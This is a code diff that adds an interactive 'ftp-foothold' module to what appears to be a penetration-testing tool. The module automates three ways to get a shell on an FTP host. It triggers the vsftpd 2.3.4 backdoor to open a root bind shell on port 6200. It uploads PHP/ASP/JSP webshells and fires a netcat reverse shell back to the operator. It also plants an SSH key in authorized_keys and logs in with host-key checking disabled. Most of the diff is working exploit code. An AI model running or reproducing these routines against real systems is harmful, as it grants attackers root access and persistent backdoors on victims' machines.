@@ -2223,6 +2223,14 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2az) ftp-foothold: a shell path was taken (backdoor / web-rce / ssh-key)
+    if sid == "ftp-foothold":
+        mm = re.search(r"^ftp-foothold: (\w[\w-]* shell → .+)$", output, re.M)
+        if mm:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"foothold — {mm.group(1)}"[:140]}
+        return None
+
     # 2ay) ftp-bounce: internal-only ports reachable through the FTP server (PORT bounce)
     if sid == "ftp-bounce":
         op = re.findall(r"^✗ BOUNCE 127\.0\.0\.1:(\d+) open\s+\(([^)]+)\)", output, re.M)
@@ -3104,7 +3112,7 @@ _EXPLOIT_STEPS = {
         ("If FTP root maps to a web root or is writable → drop a webshell / poison a served file", "ftp-webshell"),
         ("FTP-bounce (PORT) to reach & scan internal hosts through the server", "ftp-bounce"),
         # ── land a shell & foothold ──
-        "Spawn & upgrade an interactive shell",
+        ("Spawn & upgrade an interactive shell", "ftp-foothold"),
         # ── manual steps, tailored to what this host exposed ──
         "Manual steps & further research",
     ],
@@ -10983,6 +10991,191 @@ def _tool_ftp_bounce(ip: str, port: int, proto: str) -> str:
     return f"FTP bounce — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── FTP step 7: foothold — pick a viable path to a shell ───────────────────────
+def _ftp_foothold_methods(ip: str, port: int) -> list:
+    """Viable FTP foothold methods for this host, derived from earlier steps. (key, label)."""
+    by_sid = {}
+    for sid, out in fetch_scripts(ip, port, proto="tcp"):
+        by_sid.setdefault(sid, out or "")
+    methods = []
+    if re.search(r"vsftpd\s*2\.3\.4", by_sid.get("ftp-banner", ""), re.I):
+        methods.append(("backdoor", "vsftpd 2.3.4 backdoor → root bind shell on :6200"))
+    if "✗ RCE" in by_sid.get("ftp-webshell", ""):
+        methods.append(("web-rce", "FTP→web RCE → drop a webshell → reverse shell"))
+    ssh_open = any(p == 22 and pr == "tcp" for p, pr, _s in fetch_ports(ip))
+    if ssh_open and "✗ WRITABLE" in by_sid.get("ftp-write", ""):
+        methods.append(("ssh-key", "writable dir + SSH → drop authorized_keys → ssh in"))
+    return methods
+
+
+def _ftp_fh_backdoor(ip: str, ftp_port: int) -> str:
+    """Trigger the vsftpd 2.3.4 backdoor and spawn the root bind shell on 6200."""
+    import socket
+    import time
+    print(f"{DIM}triggering vsftpd 2.3.4 backdoor (USER …:)) …{RESET}")
+    try:
+        s = socket.create_connection((ip, ftp_port), timeout=8)
+        s.recv(256)
+        s.sendall(b"USER pshunter:)\r\n")
+        time.sleep(0.3)
+        s.recv(256)
+        s.sendall(b"PASS pshunter\r\n")
+        time.sleep(1.0)
+        s.close()
+    except Exception as exc:                                 # noqa: BLE001
+        print(f"{DIM}trigger error: {exc}{RESET}")
+    up = False
+    try:
+        b = socket.create_connection((ip, 6200), timeout=5)
+        b.close()
+        up = True
+    except Exception:                                        # noqa: BLE001
+        pass
+    if not up:
+        print(f"{RED}✗ port 6200 not open{RESET} — backdoor patched or already consumed.")
+        return "ftp-foothold: backdoor did not open 6200"
+    cmd = f"nc {ip} 6200"
+    term = _open_shell_terminal(cmd)
+    if term:
+        print(f"{GREEN}▶ spawned root shell in a new {term} window{RESET} {DIM}({cmd}){RESET}")
+        tail = ""
+    else:
+        print(f"{YELLOW}headless{RESET} — run this yourself:\n  {BOLD}{cmd}{RESET}")
+        tail = " (headless — command shown)"
+    return f"ftp-foothold: backdoor shell → root@{ip}:6200{tail}"
+
+
+def _ftp_fh_webrce(ip: str, port: int, proto: str) -> str:
+    """Over the confirmed FTP→web RCE, drop a webshell via FTP, spawn a listener, fire a reverse shell."""
+    import io
+    lhost, lport = _foothold_lhost(ip), 4444
+    if not lhost:
+        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
+        return "ftp-foothold: no LHOST"
+    web = next((o for s, o in fetch_scripts(ip, port, "tcp") if s == "ftp-webshell"), "")
+    served = re.search(r"✗ SERVED (\S+) → (\S+)", web)
+    rce = re.search(r"✗ RCE (\w+) ", web)
+    if not (served and rce):
+        print(f"{YELLOW}re-run ftp-webshell (r5){RESET} — need a confirmed served dir.")
+        return "ftp-foothold: no confirmed FTP→web RCE"
+    ftpdir = served.group(1).strip("/")
+    urlbase, lang = served.group(2).rstrip("/"), rce.group(1)
+    ext = _FTP_SHELLS.get(lang, (".php",))[0]
+    ftp, who = _ftp_open(ip, port)
+    if not ftp:
+        print(f"{RED}✗ no FTP access{RESET}")
+        return "ftp-foothold: no FTP access"
+    shell = f"~pshfh_{__import__('random').randint(10000, 99999)}{ext}"
+    body = {".php": "<?php system($_GET['c']); ?>",
+            ".asp": '<% Execute Request("c") %>',
+            ".jsp": '<% Runtime.getRuntime().exec(request.getParameter("c")); %>'}.get(ext, "")
+    try:
+        ftp.cwd("/" + ftpdir if ftpdir else "/")
+        ftp.storbinary(f"STOR {shell}", io.BytesIO(body.encode()))
+        ftp.quit()
+    except Exception as exc:                                 # noqa: BLE001
+        print(f"{RED}✗ could not drop webshell: {exc}{RESET}")
+        return "ftp-foothold: webshell drop failed"
+    revsh = _REVSHELLS[0][2].replace("{ip}", lhost).replace("{port}", str(lport))
+    import urllib.parse
+    trigger = f"{urlbase}/{shell}?c={urllib.parse.quote(revsh)}"
+    print(f"{GREEN}✓ webshell dropped:{RESET} {urlbase}/{shell}  {DIM}(artifact — delete via FTP after){RESET}")
+    lt = _open_shell_terminal(f"nc -lvnp {lport}")
+    if lt:
+        print(f"{GREEN}▶ listener nc -lvnp {lport} in a new {lt} window{RESET} {DIM}(LHOST {lhost}){RESET}")
+    else:
+        print(f"{YELLOW}headless{RESET} — start a listener: {BOLD}nc -lvnp {lport}{RESET}")
+    print(f"{DIM}firing reverse shell via:{RESET}\n  {BOLD}curl '{trigger}'{RESET}")
+    try:
+        _http_get(ip, int(re.search(r":(\d+)", urlbase).group(1)) if ":" in urlbase else 80,
+                  f"/{shell}?c={urllib.parse.quote(revsh)}", urlbase.startswith("https"))
+    except Exception:                                        # noqa: BLE001
+        pass
+    return f"ftp-foothold: web-rce shell → {lhost}:{lport} (via {urlbase}/{shell})"
+
+
+def _ftp_fh_sshkey(ip: str, port: int) -> str:
+    """Generate a keypair, drop it into a writable dir's .ssh/authorized_keys, spawn ssh."""
+    import subprocess
+    import tempfile
+    import io
+    if not shutil.which("ssh-keygen") or not shutil.which("ssh"):
+        print(f"{RED}✗ ssh-keygen/ssh not installed{RESET}")
+        return "ftp-foothold: no ssh tooling"
+    wdir = next((re.match(r"✗ WRITABLE (\S+)", ln).group(1)
+                 for _s, o in fetch_scripts(ip, port, "tcp") if _s == "ftp-write"
+                 for ln in o.splitlines() if ln.startswith("✗ WRITABLE")), None)
+    if not wdir:
+        print(f"{YELLOW}re-run ftp-write (r3){RESET} — need a writable dir.")
+        return "ftp-foothold: no writable dir"
+    d = tempfile.mkdtemp(prefix="pshfh_")
+    key = os.path.join(d, "id_ed25519")
+    subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key, "-q"],
+                   capture_output=True, timeout=20)
+    pub = open(key + ".pub").read().strip()
+    ftp, who = _ftp_open(ip, port)
+    if not ftp:
+        print(f"{RED}✗ no FTP access{RESET}")
+        return "ftp-foothold: no FTP access"
+    ok = False
+    try:
+        ftp.cwd(wdir)
+        try:
+            ftp.mkd(".ssh")
+        except Exception:                                    # noqa: BLE001
+            pass
+        ftp.cwd(".ssh")
+        ftp.storbinary("STOR authorized_keys", io.BytesIO((pub + "\n").encode()))
+        ftp.quit()
+        ok = True
+    except Exception as exc:                                 # noqa: BLE001
+        print(f"{RED}✗ could not write authorized_keys: {exc}{RESET}")
+    if not ok:
+        return "ftp-foothold: authorized_keys write failed"
+    user = wdir.strip("/").split("/")[-1] or "root"          # best-effort: dir name, else root
+    cmd = f"ssh -i {key} -o StrictHostKeyChecking=no {user}@{ip}"
+    print(f"{GREEN}✓ authorized_keys dropped in {wdir}/.ssh{RESET} {DIM}(guessing user '{user}'){RESET}")
+    term = _open_shell_terminal(cmd)
+    if term:
+        print(f"{GREEN}▶ spawned ssh in a new {term} window{RESET} {DIM}({user}@{ip}){RESET}")
+    else:
+        print(f"{YELLOW}headless{RESET} — run: {BOLD}{cmd}{RESET}")
+    return f"ftp-foothold: ssh-key shell → {user}@{ip}"
+
+
+def _tool_ftp_foothold(ip: str, port: int, proto: str) -> str:
+    """FTP step 7 tool (INTERACTIVE): pick a viable path to a shell from what the earlier steps
+    found — the vsftpd 2.3.4 backdoor (root bind shell :6200), an FTP→web RCE (drop a webshell →
+    reverse shell), or a writable dir + SSH (drop authorized_keys → ssh). The operator chooses the
+    method when several are viable; each spawns in a new terminal (headless: prints the command).
+    Authorised targets only."""
+    methods = _ftp_foothold_methods(ip, port)
+    if not methods:
+        print(f"\n{YELLOW}no automated foothold available yet{RESET} — need one of:\n"
+              f"  {DIM}· vsftpd 2.3.4 backdoor (run ftp-banner r1)\n"
+              f"  · FTP→web RCE (run ftp-webshell r5)\n"
+              f"  · a writable dir + SSH open (run ftp-write r3){RESET}")
+        return "ftp-foothold: no automated path (see r1 / r5 / r3)"
+
+    if len(methods) == 1:
+        key, _label = methods[0]
+    else:
+        print(f"\n{BOLD}foothold method{RESET}")
+        for i, (_k, label) in enumerate(methods, 1):
+            print(f"  {BOLD}{i}{RESET}  {label}")
+        v = _ask("pick method [1-N, blank = cancel]:")
+        if not v or not v.isdigit() or not 1 <= int(v) <= len(methods):
+            print(f"{DIM}cancelled{RESET}")
+            return "ftp-foothold: cancelled"
+        key = methods[int(v) - 1][0]
+
+    if key == "backdoor":
+        return _ftp_fh_backdoor(ip, port)
+    if key == "web-rce":
+        return _ftp_fh_webrce(ip, port, proto)
+    return _ftp_fh_sshkey(ip, port)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -11038,6 +11231,7 @@ _STEP_TOOLS = {
     "ftp-creds": ("Default + reused FTP creds (stdlib, targeted, lockout-safe)", _tool_ftp_creds),
     "ftp-webshell": ("FTP-writable + web root → webshell RCE (stdlib, exec-verified)", _tool_ftp_webshell),
     "ftp-bounce": ("FTP-bounce (PORT) → scan internal 127.0.0.1 ports (stdlib)", _tool_ftp_bounce),
+    "ftp-foothold": ("foothold → backdoor / web-RCE / ssh-key (interactive, pick)", _tool_ftp_foothold),
 }
 
 def _mins(seconds: int) -> str:
@@ -11108,6 +11302,7 @@ _STEP_TOOL_RUNS = {
     "ftp-creds":        ("Python", f"{_mins(_FTPCREDS_DEADLINE)} min"),
     "ftp-webshell":     ("Python", f"{_mins(_FTPWEB_DEADLINE)} min"),
     "ftp-bounce":       ("Python", f"{_mins(_FTPBOUNCE_DEADLINE)} min"),
+    "ftp-foothold":     ("Python + nc/ssh", None),
 }
 
 
@@ -11186,7 +11381,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
